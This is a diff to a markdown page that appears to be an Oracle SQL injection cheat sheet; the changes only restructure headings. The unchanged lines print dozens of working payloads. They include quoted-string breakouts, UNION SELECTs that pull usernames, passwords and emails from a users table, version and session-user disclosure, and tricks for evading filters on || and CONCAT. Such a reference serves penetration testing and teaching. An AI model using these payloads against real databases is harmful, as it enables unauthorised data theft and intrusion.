@@ -7,11 +7,9 @@ tags: ["concatenation", "string manipulation", "injection"]
 lastUpdated: 2025-03-15
 ---
 
-## String Concatenation
-
 String concatenation plays a crucial role in crafting complex SQL injection payloads in Oracle databases. Understanding the various concatenation methods can help bypass filters and construct dynamic queries.
 
-### Basic String Concatenation
+## Basic String Concatenation
 
 Oracle provides multiple ways to concatenate strings:
 
@@ -22,7 +20,7 @@ Oracle provides multiple ways to concatenate strings:
 | `LISTAGG()` function | Aggregate with separator (11g R2+)  | `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)`                  | `A,B,C`            |
 | `XMLCONCAT()`        | XML-based concatenation             | `XMLCONCAT(XMLELEMENT(E, 'A'), XMLELEMENT(E, 'B')).GETCLOBVAL()` | Complex XML result |
 
-### Using Double Pipe Operator
+## Using Double Pipe Operator
 
 The double pipe (`||`) is the most common concatenation method in Oracle:
 
@@ -37,9 +35,9 @@ SELECT first_name || ' ' || last_name AS full_name FROM employees
 SELECT 'User: ' || SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### Basic Concatenation Injection
+### Basic Concatenation Injection
 
 ```sql
 -- Breaking out of quoted string
@@ -52,7 +50,7 @@ SELECT 'User: ' || SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual
 ' || (SELECT banner FROM v$version WHERE rownum=1) || '
 ```
 
-#### UNION Attack with Concatenation
+### UNION Attack with Concatenation
 
 ```sql
 -- UNION with concatenated columns
@@ -62,9 +60,9 @@ SELECT 'User: ' || SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual
 ' UNION SELECT 'Found: ' || LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), NULL FROM users--
 ```
 
-### Advanced Concatenation Techniques
+## Advanced Concatenation Techniques
 
-#### Using CONCAT Function
+### Using CONCAT Function
 
 The CONCAT function can be useful when the `||` operator is filtered:
 
@@ -76,7 +74,7 @@ The CONCAT function can be useful when the `||` operator is filtered:
 ' UNION SELECT CONCAT(CONCAT('ID:', user_id), CONCAT(':', password)), NULL FROM users--
 ```
 
-#### Using XMLAGG for Row Concatenation
+### Using XMLAGG for Row Concatenation
 
 XMLAGG is powerful for concatenating values across multiple rows:
 
@@ -88,7 +86,7 @@ XMLAGG is powerful for concatenating values across multiple rows:
 ' UNION SELECT XMLAGG(XMLELEMENT(E, username || ',') ORDER BY username).EXTRACT('//text()').GETCLOBVAL(), NULL FROM users--
 ```
 
-#### Using LISTAGG for Row Concatenation (11g+)
+### Using LISTAGG for Row Concatenation (11g+)
 
 ```sql
 -- Basic LISTAGG
@@ -98,9 +96,9 @@ XMLAGG is powerful for concatenating values across multiple rows:
 ' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) || ' (Total: ' || COUNT(*) || ')', NULL FROM users WHERE username LIKE 'A%'--
 ```
 
-### Bypassing Filters
+## Bypassing Filters
 
-#### Bypassing Concatenation Filters
+### Bypassing Concatenation Filters
 
 When `||` or CONCAT is filtered:
 
@@ -112,7 +110,7 @@ When `||` or CONCAT is filtered:
 ' UNION SELECT REPLACE('XYZ', 'X', 'A')||REPLACE('XYZ', 'X', 'B'), NULL FROM dual--
 ```
 
-#### Using TO_CHAR for Concatenation
+### Using TO_CHAR for Concatenation
 
 ```sql
 -- Converting non-string data for concatenation
@@ -122,7 +120,7 @@ When `||` or CONCAT is filtered:
 ' UNION SELECT 'Date: ' || TO_CHAR(SYSDATE, 'YYYY-MM-DD HH24:MI:SS'), NULL FROM dual--
 ```
 
-### Handling Special Characters
+## Handling Special Characters
 
 ```sql
 -- Escaping quotes
@@ -132,7 +130,7 @@ When `||` or CONCAT is filtered:
 ' UNION SELECT 'Quote: ' || CHR(39) || ' Backslash: ' || CHR(92), NULL FROM dual--
 ```
 
-### Multi-row Output Formatting
+## Multi-row Output Formatting
 
 ```sql
 -- Formatting multi-row outputs
@@ -142,14 +140,14 @@ When `||` or CONCAT is filtered:
 ' UNION SELECT 'ID: ' || TO_CHAR(ROWNUM) || CHR(10) || 'User: ' || username || CHR(10) || 'Email: ' || email, NULL FROM users--
 ```
 
-### Working with NULLs
+## Working with NULLs
 
 ```sql
 -- Handling NULLs in concatenation
 ' UNION SELECT NVL(username, 'Anonymous') || ':' || NVL(email, 'No Email'), NULL FROM users--
 ```
 
-### Performance Considerations
+## Performance Considerations
 
 For large-scale data extraction:
 
